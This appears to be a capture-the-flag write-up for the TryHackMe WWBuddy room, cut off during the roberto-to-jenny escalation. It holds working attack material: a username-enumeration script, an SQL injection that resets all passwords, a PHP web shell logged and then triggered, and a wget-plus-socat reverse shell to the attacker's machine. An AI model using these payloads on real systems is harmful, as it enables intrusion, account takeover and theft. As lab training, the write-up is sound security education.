# WWBuddy

## Introduction

Welcome to my another writeup! In this TryHackMe [WWBuddy](https://tryhackme.com/room/wwbuddy) room, you'll learn: Second order SQL injection, modifing environment variable to gain root privilege and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to roberto](#privilege-escalation)**
4. **[Privilege Escalation: roberto to jenny](#roberto-to-jenny)**
5. **[Privilege Escalation: jenny to root](#jenny-to-root)**
6. **[Conclusion](#conclusion)**

## Background

> Exploit this website still in development and root the room.
>  
> Difficulty: Medium

---

World wide buddy is a site for making friends, but it's still unfinished and it has some security flaws.

Deploy the machine and find the flags hidden in the room!

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf]
└─# export RHOSTS=10.10.94.193  
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 667521b4934aa5a7dff4018019cfffad (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsJLMZZ++Y5C7rrfjBr3NDcw28OtadaUG9ayV7tpujToTpPyR+SlEUkAFl8tPG/KyENYzXEPSz5B3s4AHCgX1uBw+PfNOV+MyCf2uPMbg0o4vOl4uPgt1clDMV9Xy8n7rznCCukHNvHbS3H7/iJhv8Pw7Sw7Qe148OVDf5P/Sp8t7QlCa3c6+bXirhWz79HGj1kzxqWc+28NG+8EPDAIpBCiV4JOt8c31EGLxL60YZv87jjasb881KcQZNPJjipw0/+vYvNYSUIwCChVAFCYsORhrYET5K6ek/NLHjkOsiGBZF57ra65lees8hTECo2jum/sFmkxp5KEy7hwThmUKV
|   256 a6dd303be496baab5f043b9e9e92b7c0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLunpUbpWWEPWQO+prxN7M8mUGVgaINwd63DcUocu8/CyUxxBvFdv/Ldwdc7jfc7WvRi5T3fHl+RGSCwQWezzbY=
|   256 0422f0d2b03445d4e54dada27dcd0041 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFPNLi5HCm6YrjWfTkBrESGLZ4YsB3ACocpDoCrmUVO1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Login
|_Requested resource was http://10.10.94.193/login/
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache httpd 2.4.29 ((Ubuntu))

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf]
└─# echo "$RHOSTS wwbuddy.thm" >> /etc/hosts
```

**Enumerate hidden directories and files via `gobuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# gobuster dir -u http://wwbuddy.thm/ -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,txt,html,bak
[...]
/admin                (Status: 301) [Size: 310] [--> http://wwbuddy.thm/admin/]
/api                  (Status: 301) [Size: 308] [--> http://wwbuddy.thm/api/]
/change               (Status: 301) [Size: 311] [--> http://wwbuddy.thm/change/]
/chat.php             (Status: 200) [Size: 1129]
/config.php           (Status: 200) [Size: 0]
/footer.html          (Status: 200) [Size: 232]
/header.html          (Status: 200) [Size: 577]
/images               (Status: 301) [Size: 311] [--> http://wwbuddy.thm/images/]
/index.php            (Status: 302) [Size: 7740] [--> /login]
/js                   (Status: 301) [Size: 307] [--> http://wwbuddy.thm/js/]
/login                (Status: 301) [Size: 310] [--> http://wwbuddy.thm/login/]
/logout.php           (Status: 302) [Size: 0] [--> /login]
/profile              (Status: 301) [Size: 312] [--> http://wwbuddy.thm/profile/]
/register             (Status: 301) [Size: 313] [--> http://wwbuddy.thm/register/]
/styles               (Status: 301) [Size: 311] [--> http://wwbuddy.thm/styles/]
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# gobuster dir -u http://wwbuddy.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 
[...]
/images               (Status: 301) [Size: 311] [--> http://wwbuddy.thm/images/]
/admin                (Status: 301) [Size: 310] [--> http://wwbuddy.thm/admin/]
/login                (Status: 301) [Size: 310] [--> http://wwbuddy.thm/login/]
/register             (Status: 301) [Size: 313] [--> http://wwbuddy.thm/register/]
/api                  (Status: 301) [Size: 308] [--> http://wwbuddy.thm/api/]
/styles               (Status: 301) [Size: 311] [--> http://wwbuddy.thm/styles/]
/profile              (Status: 301) [Size: 312] [--> http://wwbuddy.thm/profile/]
/js                   (Status: 301) [Size: 307] [--> http://wwbuddy.thm/js/]
/server-status        (Status: 403) [Size: 276]
/change               (Status: 301) [Size: 311] [--> http://wwbuddy.thm/change/]
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105044735.png)

When I go to the home page, it redirects me to `/login/index.php`.

We can try to guess an administrator level user's password:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105045349.png)

Hmm... `No account found with that username.`. Maybe we can use that error output to enumerate usernames?

Let's try to register an account and login:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105045509.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105045602.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105045719.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105045737.png)

In here, we can see that **we can view our profile, change password, edit info, send message, and logout.**

**Let's view our profile:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105050237.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105050245.png)

In the URL, it's using a GET parameter `uid` to fetch users' profile.

However, the UID value seems random and couldn't easily be guessed. So it may not vulnerable to IDOR (Insecure Direct Object Reference). Maybe it's leaked somewhere?

> Note: The `uid` is hashed by MD5, but I couldn't crack it.

We can also see a button: "Send me a message".

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105050810.png)

When we clicked that, it'll redirect us to `/index.php`, with GET parameter `send` and value of our `uid`.

We can also test for XSS (Cross-Site Scripting), client-side template injection, SSTI (Server-Side Template Injection), SQL injection in our profile:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105051329.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105051337.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105051346.png)

Hmm... Seems nothing.

Let's go to the "Change Password" page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105051559.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105051606.png)

**View source page:**
```html
<div class="passwrapper">
    <h2>Change your password</h2>
            <form action="/change/" method="post">
        <div class="form-group ">
            <label>Old password</label>
            <input type="password" name="password" class="form-control" value="">
            <span class="help-block"></span>
        </div>
            <div class="form-group ">
            <label>New password</label>
            <input type="password" name="new_password" class="form-control" value="">
            <span class="help-block"></span>
        </div>
        <div class="form-group">
            <input type="submit" class="formButton" value="Submit">
        </div>
</form>
</div>
```

In here, I don't see any CSRF (Cross-Site Request Forgery) protection, like CSRF token. It may vulnerable to CSRF.

Then try to change our password:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105051852.png)

`Something went wrong.`?

**Maybe our username triggered an SQL syntax error when it's trying to update our password?**

Also, there is no username field, so we can't change other users' password.

Let's change our username to normal:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105051952.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105052011.png)

Yep. Can confirm our SQL injection payload worked.

Now, maybe we can change our username to a SQL injection payload that update some users' password?

But before we do that, let's use the "Chat Box" to send some messages:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105052252.png)

When I clicked user "WWBuddy" chat, it returns a message to us.

We can also use Burp Suite to see what happened.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105052512.png)

When we clicked user "WWBuddy" chat, **it'll send a GET request to `/api/messages/` with parameter `uid`. Then, it responses us with a JSON data.**

**We also can see user "WWBuddy" `uid`: `fc18e5f4aa09bbbb7fdedf5e277dda00`**

Let's try to visit his profile:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105052715.png)

Nothing.

We can try to send some messages:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105053134.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105053141.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105053203.png)

When we sent a message, **it'll send a POST request to `/api/messages/` with parameter `sendto`, `message`.**

**View source page:**
```html
</div>
<script>
    var users = {"fc18e5f4aa09bbbb7fdedf5e277dda00":"WWBuddy"};
    var uid = "22db2a113d02ff43ff90f7418ce17107";
</script>
<script type="text/javascript" src="./js/chat.js"></script>
<script>
            </script>
```

**Hmm... Let's take a look at the `/js/chat.js`:**
```js
function getUsers(){
    usersdiv = document.getElementById("people");
    for (var key in users) {
        var button = document.createElement("BUTTON"); 
        button.className = "person";
        button.setAttribute("value",key);
        var img = document.createElement('img');
        img.src = "images/profile.jpg";
        img.className = "chatPic";
        var p = document.createElement('p');
        p.innerText = users[key];
        button.onclick = function(){
            setActive(this);
            getMessages(this.value);
          };
        button.appendChild(img);
        button.appendChild(p);
        usersdiv.appendChild(button);
    }
}

function setActive(active){
    children = document.getElementById("people").children;
    for(var i in children){
        current = children[i];
        if(current == active){
            current.className = "person active"
        }else{
            current.className = "person"
        }
    }
}

function getMessages(userid){
    sendto = document.getElementById("sendto");
    sendto.value = userid;
    fetch("/api/messages/?uid=" + userid)
        .then(response => {
            return response.json();
        })
        .then(messages => {
            putMessages(messages);
        })
}

function putMessages(messages){
    messagelist = document.getElementById("messages");
    messagelist.innerHTML = "";
    for(var i in messages){
        message = messages[i];
        var li = document.createElement("LI");
        li.classList.add("message");
        if(message["sender"] == uid){
            li.classList.add("send");
        }else{
            li.classList.add("receive");
        }
        li.innerText = message["content"];
        messagelist.appendChild(li);
    }
    scrollChat();
}

function scrollChat(){
    chatWindow = document.getElementById('scroll'); 
    var xH = chatWindow.scrollHeight; 
    chatWindow.scrollTo(0, xH);
}

function sendMessage(form){
    children = form.children;
    sendto = children[0].value;
    message = children[1].value;
    data = "sendto="  + sendto + "&message=" + message;
    postData("/api/messages/",data)
        .then(() => {
            children[1].value = "";
            getMessages(sendto)
        });
}

async function postData(url = '', data) {
    // Default options are marked with *
    const response = await fetch(url, {
      method: 'POST', // *GET, POST, PUT, DELETE, etc.
      mode: 'cors', // no-cors, *cors, same-origin
      cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
      credentials: 'same-origin', // include, *same-origin, omit
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      redirect: 'follow', // manual, *follow, error
      referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
      body: data // body data type must match "Content-Type" header
    });
    return response.json(); // parses JSON response into native JavaScript objects
  }

function setupPage(){
    getUsers();
    scrollChat();
    form = document.getElementById("sender");
    sendbtn = document.getElementById("btnSend");
    sendbtn.onclick = function(){
        sendMessage(form);
      };
}

setupPage();
```

Hmm... Function `sendMessage(form)` didn't have any escaping, HTML encoding in the client-side. If the server-side also didn't do that, it opens up many attack vectors.

Let's test for XSS:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054104.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054122.png)

Nope. How about event handler?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054152.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054200.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054650.png)

Hmm... Looks like the server-side application sanitized our inputs.

Then try SSTI:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054310.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054315.png)

Hmm... Let's fuzz it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054406.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105054411.png)

Nope.

Now, let's take a step back.

**In `gobuster`, we found a `/admin` directory:**
```
/admin                (Status: 301) [Size: 310] [--> http://wwbuddy.thm/admin/]
```

Let's try to reach it:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# curl -vv http://wwbuddy.thm/admin/
*   Trying 10.10.94.193:80...
* Connected to wwbuddy.thm (10.10.94.193) port 80 (#0)
> GET /admin/ HTTP/1.1
> Host: wwbuddy.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Thu, 05 Jan 2023 10:48:59 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Set-Cookie: PHPSESSID=cqrcq211qii6kca73e519vj60h; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Content-Length: 78
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host wwbuddy.thm left intact
You dont have permissions to access this file, this incident will be reported.
```

HTTP status code 403 Forbidden.

Try to bypass it?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# /opt/4-ZERO-3/403-bypass.sh -u http://wwbuddy.thm/admin/ --exploit     
exploit
💀💀💀💀💀💀💀💀💀
💀 Have a beer🍺💀 
💀💀💀💀💀💀💀💀💀
     - twitter.com/Dheerajmadhukar : @me_dheeraj
----------------------
[+] HTTP Header Bypass
----------------------
X-Originally-Forwarded-For Payload: Status: 403, Length : 78 
X-Originating-  Payload: Status: 403, Length : 78 
[...]
```

No luck.

When we try to guess an administrator level user's password, we found that the error output can be used for enumerating usernames:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105055255.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105055305.png)

**In here, we can write a simple python script to enumerate usernames:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def sendRequest(url, username):
    loginData = {
        'username': username,
        'password': 'anything'
    }

    requestResult = requests.post(url, data=loginData)
    print(f'[*] Trying username: {username:20s}', end='\r')

    if 'No account found with that username.' not in requestResult.text:
        print(f'[+] Found valid username: {username}')

def main():
    url = 'http://wwbuddy.thm/login/index.php'

    with open('/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt', 'r') as fd:
        for line in fd:
            username = line.strip()

            thread = Thread(target=sendRequest, args=(url, username))
            thread.start()

            # You can adjust how fast of each thread start. 0.05s is recommended
            sleep(0.05)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# python3 enum_usernames.py
[+] Found valid username: roberto        
[+] Found valid username: henry          
[+] Found valid username: Henry          
[+] Found valid username: Roberto        
[+] Found valid username: ROBERTO
```

Now, we can confirm we found user: `roberto`, `henry`, **AND `wwbuddy`**

## Initial Foothold

However, instead of brute forcing their password, I wanna test one thing real quick.

In `/index.php`, we can change our username, and **our username fuzzing string indeed triggered an SQL syntax error.**

**Now, what if I change the username to an SQL injection payload: `' OR 1=1-- -`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105061318.png)

Then, go to the "Change Password" page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105061339.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105061343.png)

**When we submit our new password, the SQL query might be:** (Assume it's using MySQL as the DBMS (Database Management System))
```sql
UPDATE users SET password = 'NEW_PASSWORD' WHERE old_password = users.old_password AND username = '' OR 1=1-- -' ;
```

By doing that, we should update every users' password to our newly supplied password.

**Let's do that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105062138.png)

We now should updated all users' password.

**Let's login as user `wwbuddy`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105062214.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105062227.png)

Boom! We're user `WWBuddy`!

However, nothing interested in this account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105062400.png)

And we can't go to `/admin` too.

Let's login as other users.

**roberto:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105062517.png)

Hmm... The default password for their accounts in SSH is employee's birthday.

- Roberto brithday: `04/14/1995`

**henry:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105062621.png)

- Henry brithday: `12/12/1212`

**In henry's account, we can go to the `/admin` page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105063146.png)

**View source page:**
```html
Hey Henry, i didn't made the admin functions for this page yet, but at least you can see who's trying to sniff into our site here.<br>
<!--THM{Redacted} -->

192.168.0.139   2020-07-24 22:54:34   WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00 <br>
192.168.0.139   2020-07-24 22:56:09   Roberto b5ea6181006480438019e76f8100249e <br>
[...]
```

**Armed with above information, we can try to SSH to their SSH account:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# hydra -L user.txt -P pass.txt ssh://$RHOSTS        
[...]
```

But no dice.

Let's take a step back again.

**I found that the `/admin/` is also using a PHP file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230105064550.png)

**Now, what if I create a user or change username with a PHP webshell payload?**
```php
<?php system($_GET["cmd"]); ?>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230106005658.png)

**Then go to `/admin` so our payload will get logged:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/WWBuddy/images/Pasted%20image%2020230106005729.png)

**After that login as user `henry`, and then trigger the PHP webshell:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# curl -s http://wwbuddy.thm/admin/index.php --cookie "PHPSESSID=24i8aq6e8bggaagojm6hc362dp" --get --data-urlencode "cmd=id" | tail -n 2 | head -n 1
10.9.0.253   2023-01-06 05:57:25   uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nice! We got remote code execution!

**Let's get a reverse shell:**

- Setup a listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/01/06 01:01:29 socat[50932] N opening character device "/dev/pts/2" for reading and writing
2023/01/06 01:01:29 socat[50932] N listening on AF=2 0.0.0.0:443
```

- Trigger the reverse shell:

```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# curl -s http://wwbuddy.thm/admin/index.php --cookie "PHPSESSID=24i8aq6e8bggaagojm6hc362dp" --get --data-urlencode "cmd=wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/01/06 01:01:29 socat[50932] N opening character device "/dev/pts/2" for reading and writing
2023/01/06 01:01:29 socat[50932] N listening on AF=2 0.0.0.0:443
                                                                2023/01/06 01:02:35 socat[50932] N accepting connection from AF=2 10.10.94.193:39662 on AF=2 10.9.0.253:443
                                                               2023/01/06 01:02:35 socat[50932] N starting data transfer loop with FDs [5,5] and [7,7]
                                           www-data@wwbuddy:/var/www/html/admin$ 
www-data@wwbuddy:/var/www/html/admin$ export TERM=xterm-256color
www-data@wwbuddy:/var/www/html/admin$ stty rows 22 columns 107
www-data@wwbuddy:/var/www/html/admin$ ^C
www-data@wwbuddy:/var/www/html/admin$ whoami;hostname;id;ip a
www-data
wwbuddy
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:be:79:84:16:8b brd ff:ff:ff:ff:ff:ff
    inet 10.10.94.193/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2578sec preferred_lft 2578sec
    inet6 fe80::be:79ff:fe84:168b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `www-data`!

## Privilege Escalation

### www-data to roberto

Let's do some basic enumerations!

**System users:**
```
www-data@wwbuddy:/var/www/html/admin$ cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
wwbuddy:x:1000:1000:WWBuddy:/home/wwbuddy:/bin/bash
roberto:x:1001:1001::/home/roberto:/bin/sh
jenny:x:1002:1002::/home/jenny:/bin/sh

www-data@wwbuddy:/var/www/html/admin$ ls -lah /home
total 20K
drwxr-xr-x  5 root    root    4.0K Jul 28  2020 .
drwxr-xr-x 23 root    root    4.0K Jul 25  2020 ..
drwx------  2 jenny   jenny   4.0K Jul 27  2020 jenny
drwx------  3 roberto roberto 4.0K Jul 27  2020 roberto
drwx------  6 wwbuddy wwbuddy 4.0K Jul 28  2020 wwbuddy
```

- System user: `jenny`, `roberto`, `wwbuddy`

**Found MySQL credentials:**
```
www-data@wwbuddy:/var/www/html/admin$ cat ../config.php 
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', '{Redacted}');
define('DB_NAME', 'app');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

**SUID binaries:**
```
www-data@wwbuddy:/var/www/html/admin$ find / -perm -4000 2>/dev/null
[...]
/bin/authenticate
[...]
```

```
www-data@wwbuddy:/var/www/html/admin$ /bin/authenticate 
You need to be a real user to be authenticated.
```

- Weird SUID binary: `/bin/authenticate`

**In MySQL, there is a log file called `general.log`, which is a general record of what mysqld is doing:**
```
www-data@wwbuddy:/var/www/html/admin$ cat /var/log/mysql/general.log 
/usr/sbin/mysqld, Version: 5.7.30-0ubuntu0.18.04.1 ((Ubuntu)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
2020-07-25T14:35:56.331972Z	    6 Query	show global variables where Variable_Name like "%general%"
2020-07-25T14:36:04.753758Z	    6 Quit	
2020-07-25T14:41:25.299513Z	    8 Connect	root@localhost on  using Socket
2020-07-25T14:41:25.299556Z	    8 Connect	Access denied for user 'root'@'localhost' (using password: YES)
2020-07-25T14:41:25.309432Z	    9 Connect	root@localhost on  using Socket
2020-07-25T14:41:25.309467Z	    9 Connect	Access denied for user 'root'@'localhost' (using password: YES)
2020-07-25T14:41:25.317881Z	   10 Connect	root@localhost on  using Socket
2020-07-25T14:41:25.317916Z	   10 Connect	Access denied for user 'root'@'localhost' (using password: NO)
2020-07-25T14:56:02.127981Z	   11 Connect	root@localhost on app using Socket
2020-07-25T14:56:02.128534Z	   11 Quit	
2020-07-25T15:01:40.140340Z	   12 Connect	root@localhost on app using Socket
2020-07-25T15:01:40.143115Z	   12 Prepare	SELECT id, username, password FROM users WHERE username = ?
2020-07-25T15:01:40.143760Z	   12 Execute	SELECT id, username, password FROM users WHERE username = 'Roberto{Redacted}'
2020-07-25T15:01:40.147944Z	   12 Close stmt	
2020-07-25T15:01:40.148109Z	   12 Quit	
2020-07-25T15:02:00.018314Z	   13 Connect	root@localhost on app using Socket
2020-07-25T15:02:00.018975Z	   13 Prepare	SELECT id, username, password FROM users WHERE username = ?
2020-07-25T15:02:00.019056Z	   13 Execute	SELECT id, username, password FROM users WHERE username = 'Roberto'
2020-07-25T15:02:00.089575Z	   13 Close stmt	
2020-07-25T15:02:00.089631Z	   13 Quit	
2020-07-25T15:02:00.093503Z	   14 Connect	root@localhost on app using Socket
2020-07-25T15:02:00.093662Z	   14 Query	SELECT name FROM countries
2020-07-25T15:02:00.094135Z	   14 Query	SELECT country, email, birthday, description FROM users WHERE id = 'b5ea6181006480438019e76f8100249e'
2020-07-25T15:02:00.096687Z	   14 Query	SELECT * FROM messages WHERE sender = 'b5ea6181006480438019e76f8100249e' OR receiver = 'b5ea6181006480438019e76f8100249e'
2020-07-25T15:02:00.097056Z	   14 Query	SELECT id,username FROM users WHERE id IN ('fc18e5f4aa09bbbb7fdedf5e277dda00', 'be3308759688f3008d01a7ab12041198') ORDER BY username
2020-07-25T15:02:00.097174Z	   14 Quit	
2020-07-25T15:06:48.352118Z	   15 Connect	root@localhost on app using Socket
2020-07-25T15:06:48.352492Z	   15 Quit
```

Found user `roberto`'s password!

**Let's SSH into user `roberto`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# ssh roberto@$RHOSTS   
roberto@10.10.94.193's password: 
[...]
$ whoami;hostname;id;ip a
roberto
wwbuddy
uid=1001(roberto) gid=1001(roberto) groups=1001(roberto),200(developer)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:be:79:84:16:8b brd ff:ff:ff:ff:ff:ff
    inet 10.10.94.193/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3345sec preferred_lft 3345sec
    inet6 fe80::be:79ff:fe84:168b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `roberto`!

**`/home/roberto/importante.txt`:**
```
$ cat /home/roberto/importante.txt
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.


THM{Redacted}
```

**Google translated:**
```
Jenny will be very happy when she finds out she's been hired :DD

Don't forget that next week she turns 26, when she sees the present I bought her, maybe she'll even be excited to go on a date with me.
```

### roberto to jenny

**Let's check out the weird SUID binary!**
```
$ strings /bin/authenticate
[...]
You need to be a real user to be authenticated.
